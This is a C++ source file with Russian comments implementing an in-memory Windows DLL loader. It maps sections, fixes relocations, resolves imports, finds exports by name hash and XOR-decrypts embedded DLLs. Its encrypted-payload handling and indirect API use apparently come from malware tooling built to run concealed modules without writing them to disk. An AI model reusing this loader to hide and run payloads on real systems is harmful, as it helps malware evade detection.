#include <windows.h>
#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "DllLoader.h"
#include "Crypt.h"
#include "Config.h"
#include "md5.h"


typedef struct
{
	PIMAGE_NT_HEADERS headers;
	unsigned char *codeBase;
	HMODULE *modules;
	int numModules;
	int initialized;
} MEMORYMODULE, *PMEMORYMODULE;

#define IMAGE_SIZEOF_BASE_RELOCATION 8

typedef BOOL ( WINAPI *DllEntryProc )( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved );

#define GET_HEADER_DICTIONARY( module, idx ) &(module)->headers->OptionalHeader.DataDirectory[idx]



//--------------------------------------------------------
//  Функция возвращает истину если буфер являетсяя DLL
//--------------------------------------------------------
bool BufferIsExecutableFile(LPVOID Buf)
{
	// Функция возвращает истину если буффер является заголовком
	// exe файла
	bool Result = false;
	if (Buf)
	{
		PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)Buf;

		if (Dos->e_magic == IMAGE_DOS_SIGNATURE)
		{
			PIMAGE_NT_HEADERS NT  = (PIMAGE_NT_HEADERS)&((const unsigned char *)(Buf))[Dos->e_lfanew];;
			Result = (NT->Signature == IMAGE_NT_SIGNATURE);
		}
    }
	return Result;
}
//---------------------------------------------------------------------------



void CopySections(LPBYTE data, LPBYTE codeBase, PIMAGE_NT_HEADERS old_headers, PIMAGE_NT_HEADERS new_headers)
{
	int i, size;
	unsigned char *dest;

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(new_headers);

	for ( i = 0; i < new_headers->FileHeader.NumberOfSections; i++, section++ )
	{
		if ( section->SizeOfRawData == 0 )
		{
			size = old_headers->OptionalHeader.SectionAlignment;

			if ( size > 0 )
			{
				dest = (unsigned char *)codeBase + section->VirtualAddress;///pVirtualAlloc( codeBase + section->VirtualAddress, size, MEM_COMMIT, PAGE_READWRITE );

				section->Misc.PhysicalAddress = (DWORD)dest;
				m_memset( dest, 0, size );
			}

			continue;
		}

		dest = (unsigned char *)codeBase + section->VirtualAddress; /**pVirtualAlloc( codeBase + section->VirtualAddress,
											  section->SizeOfRawData,
											  MEM_COMMIT,
											  PAGE_READWRITE );*/

		m_memcpy( dest, data + section->PointerToRawData, section->SizeOfRawData );

		section->Misc.PhysicalAddress = (DWORD)dest;
	}
}

int ProtectionFlags[2][2][2] = {
	{
		{PAGE_NOACCESS, PAGE_WRITECOPY},
		{PAGE_READONLY, PAGE_READWRITE},
	},
	{
		{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY},
		{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE},
	},
};


void FinalizeSections( PMEMORYMODULE module )
{
	int i;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION( module->headers );

	for ( i = 0; i < module->headers->FileHeader.NumberOfSections; i++, section++ )
	{
		DWORD protect, oldProtect, size;

		int executable = (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
		int readable =   (section->Characteristics & IMAGE_SCN_MEM_READ) != 0;
		int writeable =  (section->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

		if ( section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE )
		{
			///pVirtualFree((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, MEM_DECOMMIT);
			continue;
		}

		protect = ProtectionFlags[executable][readable][writeable];

		if ( section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED )
		{
			protect |= PAGE_NOCACHE;
		}

		size = section->SizeOfRawData;

		if ( size == 0 )
		{
			if ( section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA )
			{
				size = module->headers->OptionalHeader.SizeOfInitializedData;
			}
			else if ( section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA )
			{
				size = module->headers->OptionalHeader.SizeOfUninitializedData;
			}
		}

		if ( size > 0 )
		{
			if ( pVirtualProtect((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, protect, &oldProtect) == 0 )
			{
				return;
			}
		}
	}
}


void ProcessRelocation(unsigned char *CodeBase, PIMAGE_NT_HEADERS Headers, DWORD Delta)
{
	// Функция обрабатывает смещения
	if (!CodeBase || !Headers || !Delta)
		return;

	PIMAGE_DATA_DIRECTORY Directory = &Headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	if (!Directory->Size)
		return;


	PIMAGE_BASE_RELOCATION Relocation = (PIMAGE_BASE_RELOCATION)(CodeBase + Directory->VirtualAddress);

	for (; Relocation->VirtualAddress > 0; )
	{
		unsigned char *Dest = (unsigned char *)(CodeBase + Relocation->VirtualAddress);
		unsigned short *RelInfo = (unsigned short *)((unsigned char *)Relocation + IMAGE_SIZEOF_BASE_RELOCATION);

		for (DWORD i = 0; i < ((Relocation->SizeOfBlock - IMAGE_SIZEOF_BASE_RELOCATION) / 2 ); i++, RelInfo++ )
		{
			DWORD *patchAddrHL;
			int type, offset;

			type = *RelInfo >> 12;
			offset = *RelInfo & 0xfff;

			switch ( type )
			{
				case IMAGE_REL_BASED_ABSOLUTE:
					break;

				case IMAGE_REL_BASED_HIGHLOW:
					patchAddrHL = (DWORD *)(Dest + offset);
					*patchAddrHL += Delta;
					break;

				default:
					break;
			}
		}

		Relocation = (PIMAGE_BASE_RELOCATION)(((DWORD)Relocation) + Relocation->SizeOfBlock);
	}
}


/*

void PerformBaseRelocation( PMEMORYMODULE module, DWORD delta )
{
	DWORD i;
	unsigned char *codeBase = module->codeBase;

	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY( module, IMAGE_DIRECTORY_ENTRY_BASERELOC );

	if ( directory->Size > 0 )
	{
		PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)( codeBase + directory->VirtualAddress );

		for (; relocation->VirtualAddress > 0; )
		{
			unsigned char *dest = (unsigned char *)(codeBase + relocation->VirtualAddress);
			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + IMAGE_SIZEOF_BASE_RELOCATION);

			for ( i = 0; i < ((relocation->SizeOfBlock-IMAGE_SIZEOF_BASE_RELOCATION) / 2 ); i++, relInfo++ )
			{
				DWORD *patchAddrHL;
				int type, offset;

				type = *relInfo >> 12;
				offset = *relInfo & 0xfff;

				switch ( type )
				{
					case IMAGE_REL_BASED_ABSOLUTE:
						break;

					case IMAGE_REL_BASED_HIGHLOW:
						patchAddrHL = (DWORD *)(dest + offset);
						*patchAddrHL += delta;
						break;

					default:
						break;
				}
			}

			relocation = (PIMAGE_BASE_RELOCATION)(((DWORD)relocation) + relocation->SizeOfBlock);
		}
	}
}

*/


//void PerformBaseRelocation( PMEMORYMODULE module, DWORD delta )
//{
//    ProcessRelocation(module->codeBase, module->headers, delta);
//}





int BuildImportTable(PMEMORYMODULE module)
{
	int result=1;
	unsigned char *codeBase = module->codeBase;

	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);

	// Если у исполняемого файла нет импорта - это нормально.
	// Например - в случае с LoaderDll
	// Просто получается случай, когда не надо ничего настраивать.
	if ( directory->Size == 0 ) return 1;

	if ( directory->Size <= 0 ) return 0;

	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(codeBase + directory->VirtualAddress);

	for ( ; !pIsBadReadPtr(importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name; importDesc++ )
	{
		DWORD *thunkRef, *funcRef;
		HMODULE handle = (HMODULE)pLoadLibraryA( (LPCSTR)(codeBase + importDesc->Name) );

		if (handle == INVALID_HANDLE_VALUE)
		{
			result = 0;
			break;
		}

		HMODULE *p = (HMODULE*)MemRealloc( module->modules, (module->numModules+1)*(sizeof(HMODULE)) );
		module->modules = p;

		if (module->modules == NULL)
		{
			result = 0;
			break;
		}

		module->modules[module->numModules++] = handle;
		if (importDesc->OriginalFirstThunk)
		{
			thunkRef = (DWORD *)(codeBase + importDesc->OriginalFirstThunk);
			funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
		} else {
			thunkRef = (DWORD *)(codeBase + importDesc->FirstThunk);
			funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
		}
		for (; *thunkRef; thunkRef++, funcRef++)
		{
			if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
			{
				*funcRef = (DWORD)pGetProcAddress( handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef) );
			}
			else
			{
				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + *thunkRef);
				DWORD Addr;
				if (  Addr = (DWORD)pGetProcAddress( handle, (LPCSTR)&thunkData->Name ))
				{
					if ( Addr != *funcRef)
						*funcRef = Addr;
				}
			}
			if (*funcRef == 0)
			{
				result = 0;
				break;
			}
		}

		if (!result)
			break;
	}

	return result;
}

void MemoryFreeLibrary(HMEMORYMODULE mod)
{
	int i;
	PMEMORYMODULE module = (PMEMORYMODULE)mod;

	if (module != NULL)
	{
		if (module->initialized != 0)
		{
			DllEntryProc DllEntry = (DllEntryProc)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
			(*DllEntry)((HINSTANCE)module->codeBase, DLL_PROCESS_DETACH, 0);
			module->initialized = 0;
		}

		if (module->modules != NULL)
		{
			for (i=0; i<module->numModules; i++)
				if (module->modules[i] != INVALID_HANDLE_VALUE)
					pFreeLibrary(module->modules[i]);

			MemFree(module->modules);
		}

		if (module->codeBase != NULL)
			pVirtualFree(module->codeBase, 0, MEM_RELEASE);

		FreeStruct( module);
	}
}

#pragma optimize("", off)
HMEMORYMODULE MemoryLoadLibrary( const void* data, bool CallEntryPoint, void* param )
{
	PMEMORYMODULE result;
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS old_header;
	unsigned char *code, *headers;
	DWORD locationDelta;
	DllEntryProc DllEntry;
	BOOL successfull;

	dos_header = (PIMAGE_DOS_HEADER)data;
	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return NULL;
	}

	old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(data))[dos_header->e_lfanew];
	if (old_header->Signature != IMAGE_NT_SIGNATURE)
	{
		return NULL;
	}

	code = (unsigned char *)pVirtualAlloc((LPVOID)(old_header->OptionalHeader.ImageBase),
		old_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_READWRITE);

    if (code == NULL)
        code = (unsigned char *)pVirtualAlloc(NULL,
            old_header->OptionalHeader.SizeOfImage,
            MEM_COMMIT,
            PAGE_READWRITE);




	if (code == NULL)
	{
		return NULL;
	}
	result = CreateStruct(MEMORYMODULE);
	result->codeBase = code;
	result->numModules = 0;
	result->modules = NULL;
	result->initialized = 0;

	/**pVirtualAlloc(code,
		old_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_READWRITE);*/

	headers = (unsigned char *)code; /**pVirtualAlloc(code,
		old_header->OptionalHeader.SizeOfHeaders,
		MEM_COMMIT,
		PAGE_READWRITE);*/


	m_memcpy(headers, dos_header, dos_header->e_lfanew + old_header->OptionalHeader.SizeOfHeaders);
	result->headers = (PIMAGE_NT_HEADERS)&((const unsigned char *)(headers))[dos_header->e_lfanew];

	result->headers->OptionalHeader.ImageBase = (DWORD)code;

	CopySections((LPBYTE)data, code, old_header, result->headers);

	locationDelta = (DWORD)(code - old_header->OptionalHeader.ImageBase);
	if (locationDelta != 0)
		ProcessRelocation(result->codeBase, result->headers, locationDelta);


	if (!BuildImportTable(result))
		goto error;


	FinalizeSections(result);

	if (CallEntryPoint && result->headers->OptionalHeader.AddressOfEntryPoint)
	{
		DllEntry = (DllEntryProc)(code + result->headers->OptionalHeader.AddressOfEntryPoint);
		if (DllEntry == 0)
		{
			goto error;
		}

		successfull = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, param);

		if (!successfull)
		{
			goto error;
		}

		result->initialized = 1;
	}

	return (HMEMORYMODULE)result;

error:
	MemoryFreeLibrary(result);
	return NULL;
}




FARPROC MemoryGetProcAddress(HMEMORYMODULE module, const char *name)
{
	unsigned char *codeBase = ((PMEMORYMODULE)module)->codeBase;
	int idx=-1;
	DWORD i, *nameRef;
	WORD *ordinal;
	PIMAGE_EXPORT_DIRECTORY exports;
	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY((PMEMORYMODULE)module, IMAGE_DIRECTORY_ENTRY_EXPORT);
	if (directory->Size == 0)
		return NULL;

	exports = (PIMAGE_EXPORT_DIRECTORY)(codeBase + directory->VirtualAddress);
	if (exports->NumberOfNames == 0 || exports->NumberOfFunctions == 0)
		return NULL;

	nameRef = (DWORD *)(codeBase + exports->AddressOfNames);
	ordinal = (WORD *)(codeBase + exports->AddressOfNameOrdinals);

	for (i=0; i<exports->NumberOfNames; i++, nameRef++, ordinal++)
		if ( plstrcmpiA(name, (const char *)(codeBase + *nameRef)) == 0 )
		{
			idx = *ordinal;
			break;
		}

	if (idx == -1)
		return NULL;

	if ((DWORD)idx > exports->NumberOfFunctions)
		return NULL;

	return (FARPROC)(codeBase + *(DWORD *)(codeBase + exports->AddressOfFunctions + (idx*4)));
}


//---------------------------------------------------
//  Функция возвращает адрес экспортируемо функции
//  по хэшу её имени
//---------------------------------------------------
FARPROC MemoryGetProcAddress(HMEMORYMODULE module, DWORD NameHash)
{
	if (!module) return NULL;

	unsigned char *codeBase = ((PMEMORYMODULE)module)->codeBase;
	int idx=-1;
	DWORD i, *nameRef;
	WORD *ordinal;
	PIMAGE_EXPORT_DIRECTORY exports;
	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY((PMEMORYMODULE)module, IMAGE_DIRECTORY_ENTRY_EXPORT);
	if (directory->Size == 0)
		return NULL;

	exports = (PIMAGE_EXPORT_DIRECTORY)(codeBase + directory->VirtualAddress);
	if (exports->NumberOfNames == 0 || exports->NumberOfFunctions == 0)
		return NULL;

	nameRef = (DWORD *)(codeBase + exports->AddressOfNames);
	ordinal = (WORD *)(codeBase + exports->AddressOfNameOrdinals);

	for (i=0; i<exports->NumberOfNames; i++, nameRef++, ordinal++)
		if (STRA::Hash((PCHAR)(codeBase + *nameRef)) == NameHash)
		{
			idx = *ordinal;
			break;
		}

	if (idx == -1)
		return NULL;

	if ((DWORD)idx > exports->NumberOfFunctions)
		return NULL;

	return (FARPROC)(codeBase + *(DWORD *)(codeBase + exports->AddressOfFunctions + (idx*4)));
}
//----------------------------------------------------------------------------



#pragma optimize("", off)
bool BuildImport(PVOID ImageBase)
{
	MEMORYMODULE result;
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS old_header;


	dos_header = (PIMAGE_DOS_HEADER)ImageBase;

	old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(ImageBase))[dos_header->e_lfanew];

	ClearStruct(result);
	result.codeBase = (unsigned char*)ImageBase;
	result.headers = old_header;

	if (!BuildImportTable(&result))
		return false;

	return true;
};




//-------------------------------------------------
//  Функция возвращает информацию о буфере
//  загифрованной библиотеки. Используется
//  информация заголовков
//
//-------------------------------------------------
bool GetEncryptedDLLInfo(LPVOID Buf, LPVOID &StartBuf, DWORD &Size, PCHAR &Password)
{
	Password = NULL;
	StartBuf = NULL;
	Size = 0;

	if (!Buf) return false;

	PCHAR Temp = (PCHAR)Buf;

	if (STRA::Hash(Temp, ENCRYPTED_DLL_MARKER_SIZE, false) != ENCRYPTED_DLL_MARKER_HASH)
	{
		// ДЛЛ Зашифрована, возвращаем пароль
        Password = Temp;
	}

	Temp += ENCRYPTED_DLL_MARKER_SIZE;

	// Получаем размер
	Size = *(PDWORD)Temp;
	Temp += sizeof(DWORD);

	StartBuf = Temp;

	return false;
}






//*****************************************************************************
//                            TMemoryDLL
//*****************************************************************************

TMemoryDLL::TMemoryDLL(const void* DllBuf)
{
	FHandle = NULL;
    Load(DllBuf);
}
//----------------------------------------------------------------------------


TMemoryDLL::~TMemoryDLL()
{
	if (FHandle && !FNotFree)
		MemoryFreeLibrary(FHandle);
}
//----------------------------------------------------------------------------

bool TMemoryDLL::Load(const void* DllBuf)
{
	if (FHandle || ! DllBuf) return false;

	DWORD Size;
	bool Allocated;
	LPVOID NewBuf;

	if (!DecodeDll(DllBuf, Size, NewBuf, Allocated))
		return false;

    FHandle = MemoryLoadLibrary(NewBuf);

	if (Allocated)
		MemFree(NewBuf);

	return FHandle != NULL;
}
//----------------------------------------------------------------------------

LPVOID TMemoryDLL::GetProcAddress(const char* Name)
{
	// Функция возвращает адрес функции библиотеки
	if (FHandle && !STRA::IsEmpty(Name))
		return (LPVOID)MemoryGetProcAddress(FHandle, Name);
	else
		return NULL;
}
//----------------------------------------------------------------------------

LPVOID TMemoryDLL::GetProcAddress(DWORD NameHash)
{
	// Функция возвращает адрес экспортируемо ункции по её хэшу
	return (FHandle) ? (LPVOID)MemoryGetProcAddress(FHandle, NameHash) : NULL;
}
//----------------------------------------------------------------------------

bool TMemoryDLL::GetProcAddress(const char* Name, LPVOID &Addr)
{
	Addr = GetProcAddress(Name);
	return Addr != NULL;
}
//----------------------------------------------------------------------------

bool TMemoryDLL::GetProcAddress(DWORD NameHash, LPVOID &Addr)
{
	Addr = GetProcAddress(NameHash);
	return Addr != NULL;
}

//----------------------------------------------------------------------------

//---------------------------------------------------------
//  Функция расшифровывает длл
//
//  DllBuf - Указатель на исходный буфер длл
//
//  Выходные параметры:
//
//  DllSize - размер расшифрованной длл
//  NewBuf  - Указатель на буфер длл
//  NewBufAllocated - Установится в истину, если
//                    для буфера пришлось выделить память
//---------------------------------------------------------
bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
{
	DllSize = 0;
	NewBuf  = NULL;
	NewBufAllocated = false;
	
	if (!DllBuf) return false;

	// Файл в исходном формате
	if (BufferIsExecutableFile((LPVOID)DllBuf))
	{
		// Определяем размер длл файла
		PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)DllBuf;
		PIMAGE_NT_HEADERS old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(DllBuf))[dos_header->e_lfanew];;

		DllSize = old_header->OptionalHeader.SizeOfHeaders +
				  old_header->OptionalHeader.SizeOfCode +
				  old_header->OptionalHeader.SizeOfInitializedData;

        // Копируем указатель
		NewBuf = (LPVOID)DllBuf;
		return true;
	}

	// ДЛЛ зашифрована, расшифровываем

	PCHAR Buf = (PCHAR)DllBuf;
	PCHAR Password = Buf;

	// Проверяем маркер библиотеки. Наличие маркера в открытом виде
	// означает, что данные длл находятся в окрытом виде
	NewBufAllocated = STRA::Hash(Buf, ENCRYPTED_DLL_MARKER_SIZE, false) != ENCRYPTED_DLL_MARKER_HASH;
	Buf += ENCRYPTED_DLL_MARKER_SIZE;

	// Получаем размер данных
	DllSize = *(PDWORD)Buf;
	Buf += sizeof(DWORD);

	if (NewBufAllocated)
	{
		// Расшифровываем данные

		NewBuf = MemAlloc(DllSize);
		if (NewBuf)
		{
			// Копируем данные
			m_memcpy(NewBuf, Buf, DllSize);
			XORCrypt::Crypt(Password, (LPBYTE)NewBuf, DllSize);
        }
	}
	else
		NewBuf = Buf;

	bool Result = BufferIsExecutableFile(NewBuf);

	if (!Result)
	{
		DllSize = 0;
		if (NewBufAllocated)
			MemFree(NewBuf);
		NewBuf = NULL;
	}

	return Result;
}



